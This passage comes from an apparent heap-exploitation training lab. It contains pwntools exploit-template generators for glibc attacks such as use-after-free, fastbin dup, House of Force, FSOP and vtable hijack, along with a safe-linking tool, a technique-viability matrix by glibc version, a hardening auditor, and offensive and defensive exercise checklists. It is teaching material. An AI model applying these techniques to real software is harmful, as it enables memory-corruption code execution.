        return self._header() + '''
p = process(elf.path)

# === PHASE 1: Allocate target object ===
# The target object should contain a function pointer or security-critical field

# === PHASE 2: Free the object (creates dangling pointer) ===
# Verify that the pointer is NOT nulled after free

# === PHASE 3: Reallocate same-size chunk with controlled content ===
# Tcache LIFO ensures the freed slot is reused first (same thread)
# Write attacker-controlled data to overlap the original object

# === PHASE 4: Trigger use of dangling pointer ===
# The program accesses the original pointer, now reading attacker data

# For function pointer hijack:
#   - Find target function address (win, system, one_gadget)
#   - Write at the correct offset within the reallocated chunk

# For vtable hijack (C++):
#   - Construct fake vtable in known memory
#   - Write fake vptr at offset 0 of the reallocated chunk
#   - Trigger virtual call through dangling reference

p.interactive()
'''

    def _gen_fastbin_dup(self):
        return self._header() + self._safe_linking_helpers() + '''
p = process(elf.path)

SIZE = 0x30  # Must be in fastbin range (< global_max_fast, default 128)

# === STEP 1: Allocate three same-size chunks ===
# a = alloc(SIZE)
# b = alloc(SIZE)
# c = alloc(SIZE)

# === STEP 2: Double-free with interleave ===
# free(a)  # fastbin: A → NULL
# free(b)  # fastbin: B → A → NULL
# free(a)  # fastbin: A → B → A → ... (cycle)

# === STEP 3: Corrupt fd pointer ===
# d = alloc(SIZE)  # returns A
# write(d, target_addr)  # overwrite A's fd with target
# e = alloc(SIZE)  # returns B
# f = alloc(SIZE)  # returns A (again)
# g = alloc(SIZE)  # returns target!

# === STEP 4: Write payload at target ===

p.interactive()
'''

    def _gen_house_of_force(self):
        if self.glibc_ver >= (2, 29):
            return "# House of Force is DEAD on glibc 2.29+ (top size validation)\n"
        return self._header() + '''
p = process(elf.path)

# === STEP 1: Overflow to corrupt top chunk size ===
# Overwrite top chunk's size field with (size_t)-1

# === STEP 2: Calculate distance to target ===
# distance = target_addr - top_chunk_addr - 2*SIZE_SZ

# === STEP 3: Advance top chunk ===
# alloc(distance)  # moves top to just before target

# === STEP 4: Allocate at target ===
# controlled = alloc(small_size)  # returns memory at target

p.interactive()
'''

    def _gen_house_of_spirit(self):
        return self._header() + '''
p = process(elf.path)

# === STEP 1: Construct fake chunk at target ===
# Write a valid chunk header (size field with PREV_INUSE)
# For tcache: only size field needed (pre-safe-linking)
# For fastbin: also need valid next-chunk size

# === STEP 2: Free the fake chunk ===
# Corrupt a pointer to point at fake chunk's user data area
# free(corrupted_ptr)  # fake chunk enters bin

# === STEP 3: Allocate from the fake bin entry ===
# alloc(matching_size)  # returns fake chunk address

p.interactive()
'''

    def _gen_unsorted_bin(self):
        if self.glibc_ver >= (2, 29):
            return "# Classic unsorted bin attack DEAD on glibc 2.29+ (bk check)\n"
        return self._header() + '''
p = process(elf.path)

# === STEP 1: Free large chunk into unsorted bin ===
# chunk must be > tcache max (0x410 on 64-bit)

# === STEP 2: Corrupt bk pointer ===
# Set bk = target_addr - 0x10
# The write: *(target) = main_arena_addr (a libc address)

# === STEP 3: Trigger unsorted bin processing ===
# alloc(same_size)  # _int_malloc iterates unsorted bin

p.interactive()
'''

    def _gen_fsop(self):
        return self._header() + self._safe_linking_helpers() + '''
p = process(elf.path)

# FSOP (File Stream Oriented Programming) — glibc 2.34+
# Target: _IO_list_all → fake _IO_FILE with crafted _wide_data

# === STEP 1: Leak libc and heap ===
# Need: libc base (for _IO_list_all, system, etc.)
# Need: heap base (for safe-linking and fake structure placement)

# === STEP 2: Construct fake _IO_FILE ===
fake_io = b""
fake_io += p32(0xfbad2887)  # _flags (passes _IO_MAGIC check)
fake_io += p32(0)           # padding
fake_io += p64(0)           # _IO_read_ptr
fake_io += p64(0)           # _IO_read_end
fake_io += p64(0)           # _IO_read_base
fake_io += p64(0)           # _IO_write_base (< _IO_write_ptr to trigger overflow)
fake_io += p64(1)           # _IO_write_ptr
fake_io += p64(0)           # _IO_write_end
# ... fill remaining fields ...
# Set _wide_data → fake_wide_data (for House of Apple variant)
# Set vtable → valid vtable within __libc_IO_vtables

# === STEP 3: Overwrite _IO_list_all with heap address ===
# Use tcache poisoning or largebin attack

# === STEP 4: Trigger _IO_flush_all_lockp ===
# Call exit() or trigger abort() via heap corruption

p.interactive()
'''

    def _gen_vtable_hijack(self):
        return self._header() + '''
p = process(elf.path)

# C++ vtable hijack via UAF

# === STEP 1: Create C++ object with virtual methods ===
# The object has a vptr at offset 0

# === STEP 2: Delete the object (dangling pointer remains) ===

# === STEP 3: Reallocate same-size buffer with fake vptr ===
# Option A: Point vptr at inline fake vtable
#   vptr → &(object + N)  where object+N contains target func addr
# Option B: Point vptr at known-good vtable + offset
#   Use partial overwrite to redirect to nearby vtable entry

fake_vptr = p64(fake_vtable_addr)  # points to array of function pointers
fake_vtable = p64(target_function)  # first entry = function to call
payload = fake_vptr + fake_vtable

# === STEP 4: Trigger virtual call ===
# obj->virtual_method()  → loads vptr → calls fake entry

p.interactive()
'''
```

#### heapexploitlab/safelink.py

```python
"""Safe-linking (glibc 2.32+) encode/decode utilities."""


class SafeLinkingTool:
    def encode(self, storage_addr, target):
        """PROTECT_PTR: stored = target ^ (storage_addr >> 12)"""
        return target ^ (storage_addr >> 12)

    def decode(self, storage_addr, encoded):
        """REVEAL_PTR: target = encoded ^ (storage_addr >> 12)"""
        return self.encode(storage_addr, encoded)

    def extract_key(self, encoded_null):
        """
        First entry in a tcache bin with next=NULL:
        stored = PROTECT_PTR(addr, 0) = addr >> 12
        Returns the XOR key (= addr >> 12)
        """
        return encoded_null

    def verify_alignment(self, ptr, alignment=16):
        """Check if pointer passes glibc 2.32+ alignment check."""
        return (ptr % alignment) == 0
```

#### heapexploitlab/glibc_info.py

```python
"""glibc version → exploitation compatibility matrix."""


class GlibcVersionInfo:
    TIMELINE = {
        (2, 26): {
            'added': ['Tcache (no security checks)'],
            'techniques': {
                'tcache_poison': 'TRIVIAL',
                'fastbin_dup': 'TRIVIAL',
                'house_of_force': 'VIABLE',
                'unsorted_bin_attack': 'VIABLE',
                'malloc_hook': 'VIABLE',
            }
        },
        (2, 27): {
            'added': ['Tcache key (double-free detection)'],
            'techniques': {
                'tcache_double_free': 'BYPASS via key corruption',
            }
        },
        (2, 29): {
            'added': ['Unsorted bin bk check', 'Top chunk size validation'],
            'killed': ['House of Force', 'Unsorted bin attack',
                       'House of Orange (original)'],
        },
        (2, 30): {
            'added': ['Tcache stashing unlink check', 'Largebin insertion checks'],
            'killed': ['Tcache stashing unlink (simple)'],
        },
        (2, 32): {
            'added': ['Safe-linking (XOR pointer obfuscation)',
                       'Alignment checks on tcache/fastbin returns'],
            'impact': 'All tcache/fastbin techniques now require heap leak',
        },
        (2, 34): {
            'added': ['Random tcache key', 'Removed __malloc_hook/__free_hook'],
            'killed': ['__malloc_hook overwrite', '__free_hook overwrite'],
            'impact': 'Post-hook targets: FSOP, __exit_funcs, TLS',
        },
        (2, 35): {
            'added': ['Wide-data vtable validation'],
            'impact': 'House of Apple variant 1 harder',
        },
    }

    DISTRO_MAPPING = {
        'Ubuntu 18.04': '2.27',
        'Ubuntu 20.04': '2.31',
        'Ubuntu 22.04': '2.35',
        'Ubuntu 24.04': '2.39',
        'Debian 11':    '2.31',
        'Debian 12':    '2.36',
        'RHEL 8':       '2.28',
        'RHEL 9':       '2.34',
        'Fedora 40':    '2.39',
    }

    def __init__(self, version_str):
        self.version = tuple(int(x) for x in version_str.split('.'))

    def print_compatibility(self):
        print(f"\n=== glibc {'.'.join(str(x) for x in self.version)} "
              f"Exploitation Compatibility ===\n")

        # Show what was added up to this version
        print("Active hardening:")
        for ver, info in sorted(self.TIMELINE.items()):
            if ver <= self.version:
                for item in info.get('added', []):
                    print(f"  [{'.'.join(str(x) for x in ver)}] {item}")

        # Show technique viability
        print("\nTechnique viability:")
        techniques = {
            'Tcache poisoning':     'TRIVIAL' if self.version < (2, 32)
                                     else 'NEEDS HEAP LEAK',
            'Fastbin dup':          'TRIVIAL' if self.version < (2, 32)
                                     else 'NEEDS HEAP LEAK',
            'House of Force':       'VIABLE' if self.version < (2, 29) else 'DEAD',
            'Unsorted bin attack':  'VIABLE' if self.version < (2, 29) else 'DEAD',
            'House of Orange':      'VIABLE' if self.version < (2, 29) else 'DEAD',
            'Tcache stash unlink':  'VIABLE' if self.version < (2, 30) else 'DEAD',
            '__malloc_hook':        'VIABLE' if self.version < (2, 34)
                                     else 'REMOVED',
            'FSOP (_IO_FILE)':      'PRIMARY TARGET' if self.version >= (2, 34)
                                     else 'AVAILABLE',
            '__exit_funcs':         'AVAILABLE (needs PTR_MANGLE leak)',
            'House of Einherjar':   'VIABLE' if self.version < (2, 39)
                                     else 'CONSTRAINED',
            'Largebin attack':      'CONSTRAINED' if self.version >= (2, 30)
                                     else 'VIABLE',
        }

        for tech, status in techniques.items():
            if 'DEAD' in status or 'REMOVED' in status:
                marker = '[-]'
            elif 'VIABLE' in status or 'TRIVIAL' in status:
                marker = '[!]'
            else:
                marker = '[*]'
            print(f"  {marker} {tech}: {status}")

        # Show matching distributions
        print("\nDistributions with this glibc:")
        ver_str = '.'.join(str(x) for x in self.version)
        for distro, dver in self.DISTRO_MAPPING.items():
            if dver == ver_str:
                print(f"  - {distro}")
```

#### heapexploitlab/audit.py

```python
"""Heap security audit for compiled binaries."""

import subprocess
from pathlib import Path


class HeapSecurityAuditor:
    REQUIRED_CHECKS = [
        ('Full RELRO', 'relro', lambda v: v == 'Full'),
        ('PIE', 'pie', lambda v: v is True),
        ('Stack canary', 'canary', lambda v: v is True),
        ('NX', 'nx', lambda v: v is True),
    ]

    RECOMMENDED_CHECKS = [
        ('FORTIFY_SOURCE', 'fortify', lambda v: v is True),
    ]

    def __init__(self, binary_path):
        self.binary = Path(binary_path)

    def audit(self):
        from .analyzer import HeapBinaryAnalyzer
        analyzer = HeapBinaryAnalyzer(str(self.binary))
        analyzer.full_analysis()

        print(f"\n=== Heap Security Audit: {self.binary.name} ===\n")

        all_pass = True

        print("Required protections:")
        for name, key, check in self.REQUIRED_CHECKS:
            val = analyzer.protections.get(key, 'unknown')
            passed = check(val)
            status = 'PASS' if passed else 'FAIL'
            if not passed:
                all_pass = False
            print(f"  [{status}] {name}: {val}")

        print("\nRecommended protections:")
        for name, key, check in self.RECOMMENDED_CHECKS:
            val = analyzer.protections.get(key, False)
            passed = check(val)
            status = 'PASS' if passed else 'WARN'
            print(f"  [{status}] {name}: {val}")

        if analyzer.dangerous:
            print("\nDangerous functions (should be replaced):")
            for func, risk in analyzer.dangerous.items():
                print(f"  {func}(): {risk}")
            all_pass = False

        verdict = "PASS" if all_pass else "FAIL — remediation required"
        print(f"\nVerdict: {verdict}")
        return all_pass
```

---

## Lab Validation Checklist

### Offensive Exercises

| # | Exercise | Verification | Status |
|---|----------|-------------|--------|
| 1 | Chunk forensics | GDB shows correct malloc_chunk layout, tcache counts, bin contents | [ ] |
| 2 | Heap overflow | Function pointer hijacked, shell obtained via `win()` | [ ] |
| 3a | UAF function ptr | Dangling pointer used after realloc, `admin_handler` called | [ ] |
| 3b | UAF heap spray | Spray replaces freed slot, `node_admin` executes `/bin/sh` | [ ] |
| 4a | Tcache poison (no safe-link) | Arbitrary allocation at `admin_flag` address | [ ] |
| 4b | Tcache poison (safe-link) | Safe-linking bypassed with heap key leak | [ ] |
| 5a | Fastbin dup | Freelist cycle created, arbitrary allocation achieved | [ ] |
| 5b | Tcache double-free | Key field corrupted, double-free bypasses detection | [ ] |
| 6a | House of Force | Top chunk corrupted to -1, allocation at stack target | [ ] |
| 6b | House of Spirit | Fake chunk freed and reclaimed on stack | [ ] |
| 6c | Poison null byte | Off-by-one null → overlapping chunk via backward coalesce | [ ] |
| 7 | C++ vtable hijack | Fake vptr redirects virtual call to `win()` | [ ] |
| 8a | Libc leak | `main_arena` address extracted from unsorted bin fd/bk | [ ] |
| 8b | Unsorted bin attack | Libc address written to target variable | [ ] |

### Defensive Exercises

| # | Exercise | Verification | Status |
|---|----------|-------------|--------|
| 9.1 | ASan deployment | ASan detects UAF/overflow in CI build | [ ] |
| 9.2 | YARA rules | Rules match heap spray, tcache poison, fake vtable patterns | [ ] |
| 9.3 | Sigma rules | Rules fire on glibc heap corruption messages | [ ] |
| 9.4 | eBPF monitor | Rapid brk growth and RWX mprotect detected | [ ] |
| 9.5 | Crash analyzer | Script classifies heap crashes with MITRE mapping | [ ] |
| 10.1 | Hardened build | Binary passes all protection checks (RELRO/PIE/canary/NX) | [ ] |
| 10.2 | Protection audit | Auditor correctly identifies weak binaries | [ ] |
| 10.3 | Sysctl hardening | ASLR=2, ptrace restricted, dmesg restricted | [ ] |
| 11 | GDB forensics | `heap-forensics` command detects corruption indicators | [ ] |

### Framework

| Component | Verification | Status |
|-----------|-------------|--------|
| `heaplab analyze` | Reports protections, dangerous functions, technique viability | [ ] |
| `heaplab template` | Generates correct pwntools templates for all 8 technique types | [ ] |
| `heaplab audit` | PASS/FAIL with correct checks | [ ] |
| `heaplab glibc-info` | Correct compatibility matrix per version | [ ] |
| `heaplab safelink` | Correct encode/decode/key-extraction | [ ] |

### Cross-Verification Matrix

| Offensive Exercise | Detection Mechanism |
|---|---|
| Heap overflow (Ex 2) | ASan heap-buffer-overflow, YARA heap patterns |
| UAF (Ex 3) | ASan heap-use-after-free, crash analyzer CWE-416 |
| Tcache poisoning (Ex 4) | YARA tcache patterns, Sigma corrupted chunks |
| Double-free (Ex 5) | glibc "double free detected", ASan double-free |
| House of Force (Ex 6a) | Sigma "corrupted top size", crash analyzer |
| Poison null byte (Ex 6c) | ASan out-of-bounds, Sigma "corrupted size vs prev_size" |
| Vtable hijack (Ex 7) | YARA fake vtable in heap, crash in virtual dispatch |
| Unsorted bin attack (Ex 8b) | Sigma "corrupted unsorted chunks" |

---

## Appendix: glibc Version Detection Script

```python
#!/usr/bin/env python3
"""detect_glibc_version.py — Determine glibc version and exploitation landscape"""

import subprocess
import re
import struct
from pathlib import Path


def detect_local_glibc():
    """Detect glibc version on the local system."""
    methods = [
        lambda: subprocess.run(['ldd', '--version'],
                capture_output=True, text=True).stdout.split('\n')[0],
        lambda: subprocess.run(
            ['python3', '-c',
             'import ctypes; print(ctypes.CDLL("libc.so.6").gnu_get_libc_version())'],
            capture_output=True, text=True).stdout.strip(),
    ]

    for method in methods:
        try:
            output = method()
            match = re.search(r'(\d+\.\d+)', output)
            if match:
                return match.group(1)
        except Exception:
            continue

    return 'unknown'


def detect_from_binary(binary_path):
    """Detect glibc version linked to a specific binary."""
    try:
        result = subprocess.run(['ldd', binary_path],
                                capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'libc.so' in line:
                libc_path = line.split('=>')[1].split('(')[0].strip()
                strings_out = subprocess.run(
                    ['strings', libc_path],
                    capture_output=True, text=True
                )
                for s in strings_out.stdout.split('\n'):
                    if 'GNU C Library' in s:
                        match = re.search(r'(\d+\.\d+)', s)
                        if match:
                            return match.group(1)
    except Exception:
        pass
    return 'unknown'


def detect_features(glibc_version):
    """Determine active security features for a glibc version."""
    ver = tuple(int(x) for x in glibc_version.split('.'))
    features = {}

    features['tcache'] = ver >= (2, 26)
    features['tcache_key'] = ver >= (2, 27)
    features['unsorted_bin_check'] = ver >= (2, 29)
    features['top_size_check'] = ver >= (2, 29)
    features['tcache_stash_check'] = ver >= (2, 30)
    features['safe_linking'] = ver >= (2, 32)
    features['alignment_check'] = ver >= (2, 32)
    features['random_tcache_key'] = ver >= (2, 34)
    features['hooks_removed'] = ver >= (2, 34)
    features['wide_vtable_check'] = ver >= (2, 35)

    return features


if __name__ == '__main__':
    import sys

    if len(sys.argv) > 1:
        ver = detect_from_binary(sys.argv[1])
        print(f"Binary {sys.argv[1]}: glibc {ver}")
    else:
        ver = detect_local_glibc()
        print(f"System glibc: {ver}")

    features = detect_features(ver)
    print("\nActive security features:")
    for feat, active in features.items():
        status = 'YES' if active else 'NO'
        print(f"  {feat}: {status}")
```
